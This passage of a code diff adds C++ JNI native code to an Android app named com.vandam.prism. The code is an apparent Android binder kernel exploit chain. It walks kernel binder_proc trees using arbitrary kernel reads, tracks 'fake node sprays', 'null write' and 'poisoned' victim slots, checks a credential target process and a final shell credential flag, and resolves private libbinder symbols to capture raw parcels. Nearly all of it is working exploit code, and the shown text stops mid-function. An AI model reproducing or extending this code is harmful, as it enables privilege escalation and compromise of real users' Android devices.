+            !g_null_write_armed && g_null_write_batch_armed.empty() &&
+            !g_null_write_batch_prepared && g_final_shell_cred_valid;
     errno = 0;
     int helper_probe = g_credential_target_pid > 0
             ? kill(g_credential_target_pid, 0) : -1;
@@ -14065,6 +18663,9 @@ Java_com_vandam_prism_NativeBridge_completeTerminalCleanup(
     int isolated_total = isolated_proof.total;
     int isolated_retired = isolated_proof.retired;
     int binder_controlled_unlinks = isolated_proof.controlled_unlinks;
+    int expected_holder_retirement = isolated_proof.raw_contexts
+            ? 512 : kIsolatedRetirementCount;
+    constexpr int kExpectedTerminalCtlbufs = kCtlbufRepairCount;
     bool isolated_retirement_proved = isolated_proof.proved;
     bool inactive_spray_state = !g_fake_control_active &&
             g_fake_control_expected == 0;
@@ -14078,9 +18679,10 @@ Java_com_vandam_prism_NativeBridge_completeTerminalCleanup(
             inactive_spray_state &&
             isolated_retirement_proved &&
             binder_controlled_unlinks == g_write_successes + 1 &&
-            binder_controlled_unlinks == 7 &&
+            binder_controlled_unlinks == kExpectedTerminalCtlbufs &&
             isolated_proof.controlled_unlink_victims.count(0) == 1 &&
-            poison_attribution_valid && poisoned_before == 7 &&
+            poison_attribution_valid &&
+            poisoned_before == kExpectedTerminalCtlbufs &&
             poisoned_victims ==
                     isolated_proof.controlled_unlink_victims &&
             !g_raw_arbitrary_retained && g_raw_retained_worker == -1;
@@ -14171,8 +18773,10 @@ Java_com_vandam_prism_NativeBridge_completeTerminalCleanup(
     bool native_fds_retired = fd_retirement_quiescent && native_close_ok;
     record_stage("fd-retirement-pass");
     bool binder_objects_retired = credential_target_death &&
-            isolated_retirement_proved && isolated_total == 64 &&
-            isolated_retired == 64 && binder_controlled_unlinks == 7 &&
+            isolated_retirement_proved &&
+            isolated_total == expected_holder_retirement &&
+            isolated_retired == expected_holder_retirement &&
+            binder_controlled_unlinks == kExpectedTerminalCtlbufs &&
             raw_target_proof.retired && owner_proof.retired &&
             anchor_proof.retired;
     bool pass = sequence_complete && helper_retired &&
@@ -14190,7 +18794,7 @@ Java_com_vandam_prism_NativeBridge_completeTerminalCleanup(
     std::snprintf(state, sizeof(state),
             "status=%s stage=terminal-cleanup outcome=%s"
             " reason=%s reboot_required=%d durable=1"
-            " sequence_complete=%d required_writes=6"
+            " sequence_complete=%d required_writes=%d"
             " successful_writes=%d internal_write_misses=%d"
             " used_victims=%d helper_pid=%d helper_probe=%d"
             " helper_probe_errno=%d helper_retired=%d"
@@ -14249,6 +18853,7 @@ Java_com_vandam_prism_NativeBridge_completeTerminalCleanup(
             " raw_target_retired=%d owner_pid=%d owner_probe=%d"
             " owner_probe_errno=%d owner_retired=%d anchor_pid=%d"
             " anchor_probe=%d anchor_probe_errno=%d anchor_retired=%d"
+            " raw_holder_contexts=%d"
             " isolated_total=%d"
             " isolated_retired=%d primitive_fds=%d fake_node_fds=%d"
             " native_fds_retired=%d watchdogs_retired=%d",
@@ -14256,7 +18861,8 @@ Java_com_vandam_prism_NativeBridge_completeTerminalCleanup(
             pass ? "clean" : "incomplete",
             pass ? "none" : "cleanup-gate",
             pass ? 0 : 1, sequence_complete ? 1 : 0,
-            g_write_successes, g_internal_write_misses,
+            kTerminalRequiredWrites, g_write_successes,
+            g_internal_write_misses,
             g_write_victims_used, g_credential_target_pid,
             helper_probe, helper_probe_errno,
             helper_retired ? 1 : 0, helper_unlinked ? 1 : 0,
@@ -14344,6 +18950,7 @@ Java_com_vandam_prism_NativeBridge_completeTerminalCleanup(
             owner_proof.probe_errno, owner_proof.retired ? 1 : 0,
             anchor_proof.pid, anchor_proof.probe,
             anchor_proof.probe_errno, anchor_proof.retired ? 1 : 0,
+            isolated_proof.raw_contexts ? 1 : 0,
             isolated_total, isolated_retired,
             primitive_fds, fake_node_fds,
             native_fds_retired ? 1 : 0,
@@ -14436,7 +19043,9 @@ bool collect_terminal_ctlbuf_slots(
                const FakeControlSlot* right) {
                 return left->poison_victim < right->poison_victim;
             });
-    valid = valid && selected->size() == 7;
+    const std::size_t expected_slots = g_direct_subjective_only
+            ? static_cast<std::size_t>(g_write_successes + 1) : 7;
+    valid = valid && selected->size() == expected_slots;
     for (std::size_t index = 1; valid && index < selected->size(); ++index) {
         valid = (*selected)[index - 1]->poison_victim !=
                 (*selected)[index]->poison_victim &&
@@ -14505,8 +19114,8 @@ Java_com_vandam_prism_NativeBridge_terminalCtlbufRescuePlan(
     std::vector<const FakeControlSlot*> selected;
     bool profile_valid = g_terminal_ctlbuf_profile_valid &&
             !g_terminal_ctlbuf_repair_verified;
-    bool sequence_valid = g_direct_write_step == 7 &&
-            g_write_successes == 6;
+    bool sequence_valid = g_direct_subjective_only &&
+            g_direct_write_step == 7 && g_write_successes == 4;
     bool slots_valid = collect_terminal_ctlbuf_slots(&selected);
     bool donor_valid = sequence_valid && validate_terminal_swapped_donor();
     std::uint64_t module_label = 0;
@@ -14519,10 +19128,12 @@ Java_com_vandam_prism_NativeBridge_terminalCtlbufRescuePlan(
             module_label == g_terminal_vendor_inode_security;
     bool module_collateral_read = kernel_pointer(
                     g_terminal_vendor_inode_security) &&
-            reliable_read64(g_terminal_vendor_inode_security + 8,
-                            &module_collateral);
+            reliable_read64(
+                    g_terminal_vendor_inode_security + 8,
+                    &module_collateral);
     bool module_collateral_valid = module_collateral_read &&
-            module_collateral == g_terminal_memfd_inode_security_slot;
+            module_collateral ==
+                    g_terminal_memfd_inode_security_slot;
     bool valid = nonce_cookies && profile_valid && sequence_valid &&
             slots_valid && donor_valid && module_label_valid &&
             module_collateral_valid &&
@@ -14643,7 +19254,7 @@ Java_com_vandam_prism_NativeBridge_terminalCtlbufRescuePlan(
     int length = std::snprintf(state, sizeof(state),
             "status=pass stage=ctlbuf-rescue-plan nonce=%s"
             " module_sha256="
-            "2b4e520b65f252c1c7a51c303f8bc228663f6804cbca00f2ebc6005c9a9f26f8"
+            "ff4e063cc09b926c09b55a777705d386734a1d1db6428d3e41081486c07bbb86"
             " params=tids=%s nodes=%s"
             " kernel_base=0x%" PRIx64
             " expected_tgid=%d helper_tid=%d"
@@ -14745,6 +19356,129 @@ Java_com_vandam_prism_NativeBridge_cacheRawVictimNode(
 }
 
 extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_cacheRawVictimNodes(
+        JNIEnv* environment, jclass) {
+    const auto started = std::chrono::steady_clock::now();
+    std::array<std::uint64_t, kRawVictimCount> nodes {};
+    std::array<int, kRawVictimCount> matches {};
+    std::vector<std::pair<std::uint64_t, int>> targets;
+    for (int victim = 1; victim < kRawVictimCount; ++victim) {
+        targets.emplace_back(g_raw_victim_pointers[victim], victim);
+    }
+    std::sort(targets.begin(), targets.end());
+    bool distinct_targets = true;
+    for (std::size_t index = 1; index < targets.size(); ++index) {
+        distinct_targets = distinct_targets &&
+                targets[index - 1].first != targets[index].first;
+    }
+    std::uint32_t target_pid = static_cast<std::uint32_t>(g_raw_target_pid);
+    std::uint64_t target_proc = find_binder_proc_by_pid(
+            g_cached_current_binder_proc, target_pid);
+    if (kernel_pointer(target_proc)) {
+        g_raw_target_proc = target_proc;
+        g_last_target_binder_proc = target_proc;
+    }
+    std::uint64_t root = 0;
+    bool preflight = g_arb_read_ready && g_raw_victims_configured &&
+            distinct_targets && kernel_pointer(target_proc) &&
+            arbitrary_read64(target_proc + 24, &root) &&
+            kernel_pointer(root);
+    struct SearchFrame {
+        std::uint64_t rb;
+        std::size_t first;
+        std::size_t last;
+    };
+    std::vector<SearchFrame> pending;
+    std::set<std::uint64_t> visited;
+    if (preflight) {
+        pending.push_back({root, 0, targets.size()});
+    }
+    while (!pending.empty() && visited.size() < 4096) {
+        SearchFrame frame = pending.back();
+        pending.pop_back();
+        if (!kernel_pointer(frame.rb) || frame.first >= frame.last ||
+            !visited.insert(frame.rb).second || frame.rb < 32) {
+            continue;
+        }
+        std::uint64_t node = frame.rb - 32;
+        std::uint64_t pointer = 0;
+        if (!arbitrary_read64(node + 88, &pointer)) {
+            preflight = false;
+            break;
+        }
+        auto begin = targets.begin() + static_cast<std::ptrdiff_t>(
+                frame.first);
+        auto end = targets.begin() + static_cast<std::ptrdiff_t>(frame.last);
+        auto split = std::lower_bound(
+                begin, end, std::make_pair(pointer, 0));
+        std::size_t split_index = static_cast<std::size_t>(
+                split - targets.begin());
+        bool matched_pointer = split != end && split->first == pointer;
+        if (matched_pointer) {
+            std::uint64_t cookie = 0;
+            if (arbitrary_read64(node + 96, &cookie) &&
+                cookie == g_raw_victim_cookies[split->second]) {
+                nodes[split->second] = node;
+                ++matches[split->second];
+            }
+        }
+        if (frame.first < split_index) {
+            std::uint64_t left = 0;
+            if (!arbitrary_read64(frame.rb + 16, &left)) {
+                preflight = false;
+                break;
+            }
+            if (kernel_pointer(left)) {
+                pending.push_back({left, frame.first, split_index});
+            }
+        }
+        std::size_t right_first = split_index +
+                (matched_pointer ? 1U : 0U);
+        if (right_first < frame.last) {
+            std::uint64_t right = 0;
+            if (!arbitrary_read64(frame.rb + 8, &right)) {
+                preflight = false;
+                break;
+            }
+            if (kernel_pointer(right)) {
+                pending.push_back({right, right_first, frame.last});
+            }
+        }
+    }
+    std::set<std::uint64_t> unique_nodes;
+    int matched = 0;
+    int duplicates = 0;
+    bool pass = preflight && visited.size() < 4096;
+    for (int victim = 1; victim < kRawVictimCount; ++victim) {
+        bool exact = matches[victim] == 1 && kernel_pointer(nodes[victim]);
+        pass = pass && exact;
+        matched += exact ? 1 : 0;
+        duplicates += matches[victim] > 1 ? matches[victim] - 1 : 0;
+        if (exact) {
+            pass = unique_nodes.insert(nodes[victim]).second && pass;
+        }
+    }
+    pass = pass && unique_nodes.size() == kRawVictimCount - 1;
+    if (pass) {
+        std::copy(nodes.begin() + 1, nodes.end(),
+                  std::begin(g_raw_victim_nodes) + 1);
+    }
+    std::uint64_t elapsed_us = static_cast<std::uint64_t>(
+            std::chrono::duration_cast<std::chrono::microseconds>(
+                    std::chrono::steady_clock::now() - started).count());
+    char state[512];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-victim-cache-batch target_proc=0x%" PRIx64
+            " target_pid=%u scanned=%zu matched=%d expected=%d"
+            " unique=%zu duplicates=%d"
+            " elapsed_us=%" PRIu64,
+            pass ? "pass" : "fail", target_proc, target_pid,
+            visited.size(), matched, kRawVictimCount - 1,
+            unique_nodes.size(), duplicates, elapsed_us);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
 Java_com_vandam_prism_NativeBridge_signalDeferredExport(
         JNIEnv* environment, jclass) {
     char signal = '1';
@@ -14821,6 +19555,12 @@ Java_com_vandam_prism_NativeBridge_releaseFakeNodeSpray(
                 "status=held stage=fake-control-release"
                 " reason=unresolved-retained-node");
     }
+    if (g_null_write_batch_prepared ||
+        !g_null_write_batch_armed.empty()) {
+        return environment->NewStringUTF(
+                "status=held stage=fake-control-release"
+                " reason=batched-write-cohort reboot_required=1");
+    }
     bool write_miss = g_null_write_armed;
     int expected = g_fake_control_expected;
     int joined = release_fake_control_spray();
@@ -14830,12 +19570,1599 @@ Java_com_vandam_prism_NativeBridge_releaseFakeNodeSpray(
         g_null_write_armed = false;
         g_null_write_armed_victim = -1;
     }
-    char state[256];
+    char state[320];
     std::snprintf(state, sizeof(state),
             "status=%s stage=fake-control-release joined=%d expected=%d"
+            " duration_us=%" PRId64
             " write_miss=%d internal_write_misses=%d used_victims=%d",
             pass ? "pass" : "fail", joined, expected,
+            g_fake_control_release_microseconds,
             write_miss ? 1 : 0, g_internal_write_misses,
             g_write_victims_used);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jlong JNICALL
+Java_com_vandam_prism_NativeBridge_armBinderDeathBarrier(
+        JNIEnv* environment, jclass, jobject binder) {
+    AIBinder* native_binder = binder == nullptr
+            ? nullptr : AIBinder_fromJavaBinder(environment, binder);
+    binder_status_t status = STATUS_BAD_VALUE;
+    std::unique_ptr<prism::primitive::BinderDeathBarrier> barrier =
+            prism::primitive::BinderDeathBarrier::arm(
+                    native_binder, &status);
+    if (native_binder != nullptr) {
+        AIBinder_decStrong(native_binder);
+    }
+    if (barrier == nullptr || status != STATUS_OK) {
+        return 0;
+    }
+    return static_cast<jlong>(reinterpret_cast<std::intptr_t>(
+            barrier.release()));
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_awaitBinderDeathBarrier(
+        JNIEnv* environment, jclass, jlong handle, jint timeout_milliseconds) {
+    std::unique_ptr<prism::primitive::BinderDeathBarrier> barrier(
+            reinterpret_cast<prism::primitive::BinderDeathBarrier*>(
+                    static_cast<std::intptr_t>(handle)));
+    if (barrier == nullptr || timeout_milliseconds <= 0) {
+        return environment->NewStringUTF(
+                "status=fail stage=binder-death-barrier reason=arguments");
+    }
+    prism::primitive::DeathObservation observation = barrier->wait(
+            static_cast<std::uint64_t>(timeout_milliseconds));
+    char state[256];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=binder-death-barrier died=%d unlinked=%d"
+            " link_status=%d wait_us=%" PRIu64,
+            observation.passed ? "pass" : "fail",
+            observation.died ? 1 : 0,
+            observation.unlinked ? 1 : 0,
+            observation.link_status,
+            observation.duration_nanoseconds / 1000);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT void JNICALL
+Java_com_vandam_prism_NativeBridge_discardBinderDeathBarrier(
+        JNIEnv*, jclass, jlong handle) {
+    delete reinterpret_cast<prism::primitive::BinderDeathBarrier*>(
+            static_cast<std::intptr_t>(handle));
+}
+
+extern "C" JNIEXPORT jlong JNICALL
+Java_com_vandam_prism_NativeBridge_armProcessLifetimeGuard(
+        JNIEnv*, jclass, jint pid) {
+    int error = 0;
+    std::unique_ptr<prism::primitive::ProcessLifetimeGuard> guard =
+            prism::primitive::ProcessLifetimeGuard::arm(pid, &error);
+    if (guard == nullptr || error != 0) {
+        return 0;
+    }
+    return static_cast<jlong>(reinterpret_cast<std::intptr_t>(
+            guard.release()));
+}
+
+extern "C" JNIEXPORT jboolean JNICALL
+Java_com_vandam_prism_NativeBridge_isProcessLifetimeGuardAlive(
+        JNIEnv*, jclass, jlong handle) {
+    auto* guard = reinterpret_cast<prism::primitive::ProcessLifetimeGuard*>(
+            static_cast<std::intptr_t>(handle));
+    int error = 0;
+    return guard != nullptr && guard->alive(&error) && error == 0
+            ? JNI_TRUE : JNI_FALSE;
+}
+
+extern "C" JNIEXPORT void JNICALL
+Java_com_vandam_prism_NativeBridge_discardProcessLifetimeGuard(
+        JNIEnv*, jclass, jlong handle) {
+    delete reinterpret_cast<prism::primitive::ProcessLifetimeGuard*>(
+            static_cast<std::intptr_t>(handle));
+}
+
+namespace {
+
+struct LoadedPlatformLibrary {
+    const char* basename;
+    std::uintptr_t base = 0;
+    std::string path;
+};
+
+int find_loaded_platform_library(dl_phdr_info* info, std::size_t,
+                                 void* opaque) {
+    auto* target = static_cast<LoadedPlatformLibrary*>(opaque);
+    if (info == nullptr || target == nullptr || info->dlpi_name == nullptr) {
+        return 0;
+    }
+    const char* candidate = std::strrchr(info->dlpi_name, '/');
+    candidate = candidate == nullptr ? info->dlpi_name : candidate + 1;
+    if (std::strcmp(candidate, target->basename) != 0) {
+        return 0;
+    }
+    target->base = static_cast<std::uintptr_t>(info->dlpi_addr);
+    target->path = info->dlpi_name;
+    return 1;
+}
+
+bool elf_range_valid(std::size_t file_size, std::uint64_t offset,
+                     std::uint64_t length) {
+    return offset <= file_size && length <= file_size - offset;
+}
+
+void* resolve_loaded_platform_symbol(const char* library_basename,
+                                     const char* symbol_name) {
+    LoadedPlatformLibrary library {library_basename, 0, {}};
+    dl_iterate_phdr(find_loaded_platform_library, &library);
+    if (library.base == 0 || library.path.empty()) {
+        return nullptr;
+    }
+    int fd = open(library.path.c_str(), O_RDONLY | O_CLOEXEC);
+    struct stat status {};
+    if (fd < 0 || fstat(fd, &status) != 0 || status.st_size <= 0) {
+        if (fd >= 0) {
+            close(fd);
+        }
+        return nullptr;
+    }
+    std::size_t file_size = static_cast<std::size_t>(status.st_size);
+    void* mapping = mmap(nullptr, file_size, PROT_READ, MAP_PRIVATE, fd, 0);
+    close(fd);
+    if (mapping == MAP_FAILED) {
+        return nullptr;
+    }
+    const auto* bytes = static_cast<const std::uint8_t*>(mapping);
+    const auto* header = reinterpret_cast<const Elf64_Ehdr*>(bytes);
+    void* result = nullptr;
+    bool valid_header = file_size >= sizeof(*header) &&
+            std::memcmp(header->e_ident, ELFMAG, SELFMAG) == 0 &&
+            header->e_ident[EI_CLASS] == ELFCLASS64 &&
+            header->e_shentsize == sizeof(Elf64_Shdr) &&
+            header->e_shnum > 0 &&
+            elf_range_valid(file_size, header->e_shoff,
+                    static_cast<std::uint64_t>(header->e_shnum) *
+                            sizeof(Elf64_Shdr));
+    if (valid_header) {
+        const auto* sections = reinterpret_cast<const Elf64_Shdr*>(
+                bytes + header->e_shoff);
+        for (std::size_t index = 0; index < header->e_shnum; ++index) {
+            const Elf64_Shdr& symbols = sections[index];
+            if (symbols.sh_type != SHT_DYNSYM ||
+                    symbols.sh_entsize != sizeof(Elf64_Sym) ||
+                    symbols.sh_link >= header->e_shnum ||
+                    !elf_range_valid(file_size, symbols.sh_offset,
+                            symbols.sh_size)) {
+                continue;
+            }
+            const Elf64_Shdr& strings = sections[symbols.sh_link];
+            if (strings.sh_type != SHT_STRTAB ||
+                    !elf_range_valid(file_size, strings.sh_offset,
+                            strings.sh_size)) {
+                continue;
+            }
+            const auto* table = reinterpret_cast<const Elf64_Sym*>(
+                    bytes + symbols.sh_offset);
+            const char* names = reinterpret_cast<const char*>(
+                    bytes + strings.sh_offset);
+            std::size_t count = symbols.sh_size / sizeof(Elf64_Sym);
+            for (std::size_t symbol = 0; symbol < count; ++symbol) {
+                if (table[symbol].st_shndx == SHN_UNDEF ||
+                        table[symbol].st_name >= strings.sh_size) {
+                    continue;
+                }
+                const char* name = names + table[symbol].st_name;
+                std::size_t remaining = strings.sh_size -
+                        table[symbol].st_name;
+                if (std::memchr(name, '\0', remaining) != nullptr &&
+                        std::strcmp(name, symbol_name) == 0) {
+                    result = reinterpret_cast<void*>(
+                            library.base + table[symbol].st_value);
+                    break;
+                }
+            }
+            if (result != nullptr) {
+                break;
+            }
+        }
+    }
+    munmap(mapping, file_size);
+    return result;
+}
+
+struct PlatformParcelView {
+    const std::uint8_t* data = nullptr;
+    std::size_t data_size = 0;
+    const binder_size_t* object_offsets = nullptr;
+    std::size_t object_count = 0;
+};
+
+bool inspect_platform_parcel(JNIEnv* environment, jobject java_parcel,
+                             PlatformParcelView* view) {
+    using ParcelForJavaObject = void* (*)(JNIEnv*, jobject);
+    using ParcelData = const std::uint8_t* (*)(const void*);
+    using ParcelDataSize = std::size_t (*)(const void*);
+    using ParcelObjectsCount = std::size_t (*)(const void*);
+    using ParcelIpcObjects = std::uintptr_t (*)(const void*);
+    static auto parcel_for_java_object =
+            reinterpret_cast<ParcelForJavaObject>(
+                    resolve_loaded_platform_symbol(
+                            "libandroid_runtime.so",
+                            "_ZN7android19parcelForJavaObjectEP7_JNIEnvP8_jobject"));
+    static auto parcel_data = reinterpret_cast<ParcelData>(
+            resolve_loaded_platform_symbol("libbinder.so",
+                    "_ZNK7android6Parcel4dataEv"));
+    static auto parcel_data_size = reinterpret_cast<ParcelDataSize>(
+            resolve_loaded_platform_symbol("libbinder.so",
+                    "_ZNK7android6Parcel8dataSizeEv"));
+    static auto parcel_objects_count =
+            reinterpret_cast<ParcelObjectsCount>(
+                    resolve_loaded_platform_symbol("libbinder.so",
+                            "_ZNK7android6Parcel12objectsCountEv"));
+    static auto parcel_ipc_objects = reinterpret_cast<ParcelIpcObjects>(
+            resolve_loaded_platform_symbol("libbinder.so",
+                    "_ZNK7android6Parcel10ipcObjectsEv"));
+    if (environment == nullptr || java_parcel == nullptr || view == nullptr ||
+            parcel_for_java_object == nullptr || parcel_data == nullptr ||
+            parcel_data_size == nullptr || parcel_objects_count == nullptr ||
+            parcel_ipc_objects == nullptr) {
+        return false;
+    }
+    void* parcel = parcel_for_java_object(environment, java_parcel);
+    if (parcel == nullptr || environment->ExceptionCheck()) {
+        environment->ExceptionClear();
+        return false;
+    }
+    view->data = parcel_data(parcel);
+    view->data_size = parcel_data_size(parcel);
+    view->object_count = parcel_objects_count(parcel);
+    view->object_offsets = reinterpret_cast<const binder_size_t*>(
+            parcel_ipc_objects(parcel));
+    if (view->data == nullptr ||
+            (view->object_count > 0 && view->object_offsets == nullptr)) {
+        return false;
+    }
+    for (std::size_t index = 0; index < view->object_count; ++index) {
+        binder_size_t offset = view->object_offsets[index];
+        if (offset > view->data_size ||
+                view->data_size - offset < sizeof(flat_binder_object)) {
+            return false;
+        }
+    }
+    return true;
+}
+
+}  // namespace
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_inspectParcel(
+        JNIEnv* environment, jclass, jobject java_parcel) {
+    PlatformParcelView view;
+    if (!inspect_platform_parcel(environment, java_parcel, &view) ||
+            view.data_size < sizeof(std::uint32_t) ||
+            view.object_count != 1) {
+        char state[256];
+        std::snprintf(state, sizeof(state),
+                "status=fail stage=parcel-probe reason=layout"
+                " data=%d size=%zu objects=%zu offset=%" PRIu64,
+                view.data != nullptr ? 1 : 0, view.data_size,
+                view.object_count,
+                view.object_count > 0 && view.object_offsets != nullptr
+                        ? static_cast<std::uint64_t>(
+                                view.object_offsets[0]) : 0);
+        return environment->NewStringUTF(state);
+    }
+    std::uint32_t prefix = 0;
+    std::memcpy(&prefix, view.data, sizeof(prefix));
+    flat_binder_object object {};
+    std::memcpy(&object, view.data + view.object_offsets[0],
+            sizeof(object));
+    bool pass = prefix == UINT32_C(0x50524953) &&
+            object.hdr.type == BINDER_TYPE_BINDER &&
+            object.binder != 0 && object.cookie != 0;
+    char state[512];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=parcel-probe size=%zu objects=%zu"
+            " offset=%" PRIu64 " prefix=%08" PRIx32
+            " type=%08" PRIx32 " flags=%08" PRIx32
+            " binder=%" PRIx64 " cookie=%" PRIx64,
+            pass ? "pass" : "fail", view.data_size, view.object_count,
+            static_cast<std::uint64_t>(view.object_offsets[0]), prefix,
+            object.hdr.type, object.flags,
+            static_cast<std::uint64_t>(object.binder),
+            static_cast<std::uint64_t>(object.cookie));
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_inspectRemoteBinderParcel(
+        JNIEnv* environment, jclass, jobject java_parcel) {
+    PlatformParcelView view;
+    if (!inspect_platform_parcel(environment, java_parcel, &view) ||
+            view.data_size < sizeof(std::uint32_t) ||
+            view.object_count != 1) {
+        char state[256];
+        std::snprintf(state, sizeof(state),
+                "status=fail stage=remote-parcel-probe reason=layout"
+                " data=%d size=%zu objects=%zu offset=%" PRIu64,
+                view.data != nullptr ? 1 : 0, view.data_size,
+                view.object_count,
+                view.object_count > 0 && view.object_offsets != nullptr
+                        ? static_cast<std::uint64_t>(
+                                view.object_offsets[0]) : 0);
+        return environment->NewStringUTF(state);
+    }
+    std::uint32_t prefix = 0;
+    std::memcpy(&prefix, view.data, sizeof(prefix));
+    flat_binder_object object {};
+    std::memcpy(&object, view.data + view.object_offsets[0],
+            sizeof(object));
+    bool pass = prefix == UINT32_C(0x50525252) &&
+            object.hdr.type == BINDER_TYPE_HANDLE && object.handle > 0;
+    char state[384];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=remote-parcel-probe size=%zu objects=%zu"
+            " offset=%" PRIu64 " prefix=%08" PRIx32
+            " type=%08" PRIx32 " flags=%08" PRIx32 " handle=%u",
+            pass ? "pass" : "fail", view.data_size, view.object_count,
+            static_cast<std::uint64_t>(view.object_offsets[0]), prefix,
+            object.hdr.type, object.flags, object.handle);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_exportParcelTemplate(
+        JNIEnv* environment, jclass, jobject java_parcel, jstring java_path) {
+    constexpr std::uint64_t kMagic = UINT64_C(0x31504d544d535250);
+    constexpr std::uint32_t kVersion = 1;
+    constexpr char kPathPrefix[] =
+            "/data/user/0/com.vandam.prism/files/raw-route-";
+    PlatformParcelView view;
+    const char* path = java_path == nullptr ? nullptr :
+            environment->GetStringUTFChars(java_path, nullptr);
+    bool path_valid = path != nullptr &&
+            std::strncmp(path, kPathPrefix, sizeof(kPathPrefix) - 1) == 0 &&
+            std::strstr(path + sizeof(kPathPrefix) - 1, "/") == nullptr;
+    bool parcel_valid = inspect_platform_parcel(
+            environment, java_parcel, &view) &&
+            view.data_size <= UINT32_MAX &&
+            view.object_count <= UINT32_MAX;
+    int fd = path_valid && parcel_valid
+            ? open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC |
+                         O_NOFOLLOW, 0600)
+            : -1;
+    std::uint32_t data_size = static_cast<std::uint32_t>(view.data_size);
+    std::uint32_t object_count =
+            static_cast<std::uint32_t>(view.object_count);
+    std::uint32_t reserved = 0;
+    bool pass = fd >= 0 &&
+            write_all(fd, &kMagic, sizeof(kMagic)) &&
+            write_all(fd, &kVersion, sizeof(kVersion)) &&
+            write_all(fd, &data_size, sizeof(data_size)) &&
+            write_all(fd, &object_count, sizeof(object_count)) &&
+            write_all(fd, &reserved, sizeof(reserved)) &&
+            write_all(fd, view.object_offsets,
+                    view.object_count * sizeof(binder_size_t)) &&
+            write_all(fd, view.data, view.data_size) &&
+            fsync(fd) == 0;
+    int saved_errno = pass ? 0 : errno;
+    if (fd >= 0 && close(fd) != 0) {
+        pass = false;
+        saved_errno = errno;
+    }
+    if (path != nullptr) {
+        environment->ReleaseStringUTFChars(java_path, path);
+    }
+    char state[256];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=parcel-template-export data=%zu objects=%zu"
+            " errno=%d",
+            pass ? "pass" : "fail", view.data_size, view.object_count,
+            saved_errno);
+    return environment->NewStringUTF(state);
+}
+
+namespace {
+
+struct RetainedRawBinderRoute {
+    int fd = -1;
+    void* mapping = MAP_FAILED;
+    binder_uintptr_t callback_buffer = 0;
+    binder_uintptr_t callback_pointer = 0;
+    binder_uintptr_t callback_cookie = 0;
+    int target_handle = -1;
+    int exported_handle = -1;
+    std::uint64_t exported_pointer = 0;
+    std::uint64_t exported_cookie = 0;
+    bool victim_export_started = false;
+    bool victim_export_passed = false;
+    bool victim_retired = false;
+    std::thread victim_export_thread;
+    std::vector<std::uint32_t> holder_handles;
+    std::vector<binder_handle_cookie> death_notifications;
+};
+
+std::mutex g_retained_raw_route_mutex;
+std::vector<RetainedRawBinderRoute> g_retained_raw_routes;
+std::mutex g_holder_cohort_mutex;
+std::unique_ptr<prism::primitive::HolderCohort> g_holder_cohort;
+std::mutex g_victim_cohort_mutex;
+std::unique_ptr<prism::primitive::VictimCohort> g_victim_cohort;
+
+bool drain_raw_transaction_complete(int fd) {
+    auto deadline = std::chrono::steady_clock::now() +
+            std::chrono::milliseconds(50);
+    while (std::chrono::steady_clock::now() < deadline) {
+        pollfd descriptor {fd, POLLIN, 0};
+        auto remaining = std::chrono::duration_cast<
+                std::chrono::milliseconds>(deadline -
+                        std::chrono::steady_clock::now()).count();
+        int poll_result = poll(&descriptor, 1,
+                static_cast<int>(std::max<std::int64_t>(1, remaining)));
+        if (poll_result < 0 && errno == EINTR) {
+            continue;
+        }
+        if (poll_result <= 0) {
+            return false;
+        }
+        std::uint8_t read_buffer[256] {};
+        binder_write_read request {};
+        request.read_size = sizeof(read_buffer);
+        request.read_buffer = reinterpret_cast<binder_uintptr_t>(
+                read_buffer);
+        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
+            if (errno == EINTR) {
+                continue;
+            }
+            return false;
+        }
+        for (std::size_t cursor = 0;
+             cursor + sizeof(std::uint32_t) <= request.read_consumed;) {
+            std::uint32_t response = 0;
+            std::memcpy(&response, read_buffer + cursor,
+                    sizeof(response));
+            cursor += sizeof(response);
+            std::size_t payload_size = _IOC_SIZE(response);
+            if (cursor + payload_size > request.read_consumed) {
+                return false;
+            }
+            if (response == BR_TRANSACTION_COMPLETE) {
+                return true;
+            }
+            cursor += payload_size;
+        }
+    }
+    return false;
+}
+
+bool drain_raw_clear_death(int fd, binder_uintptr_t expected_cookie) {
+    auto deadline = std::chrono::steady_clock::now() +
+            std::chrono::milliseconds(100);
+    while (std::chrono::steady_clock::now() < deadline) {
+        pollfd descriptor {fd, POLLIN, 0};
+        auto remaining = std::chrono::duration_cast<
+                std::chrono::milliseconds>(deadline -
+                        std::chrono::steady_clock::now()).count();
+        int poll_result = poll(&descriptor, 1,
+                static_cast<int>(std::max<std::int64_t>(1, remaining)));
+        if (poll_result < 0 && errno == EINTR) {
+            continue;
+        }
+        if (poll_result <= 0) {
+            return false;
+        }
+        std::uint8_t read_buffer[256] {};
+        binder_write_read request {};
+        request.read_size = sizeof(read_buffer);
+        request.read_buffer = reinterpret_cast<binder_uintptr_t>(
+                read_buffer);
+        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
+            if (errno == EINTR) {
+                continue;
+            }
+            return false;
+        }
+        for (std::size_t cursor = 0;
+             cursor + sizeof(std::uint32_t) <= request.read_consumed;) {
+            std::uint32_t response = 0;
+            std::memcpy(&response, read_buffer + cursor,
+                    sizeof(response));
+            cursor += sizeof(response);
+            std::size_t payload_size = _IOC_SIZE(response);
+            if (cursor + payload_size > request.read_consumed) {
+                return false;
+            }
+            if (response == BR_CLEAR_DEATH_NOTIFICATION_DONE &&
+                    payload_size >= sizeof(binder_uintptr_t)) {
+                binder_uintptr_t cookie = 0;
+                std::memcpy(&cookie, read_buffer + cursor,
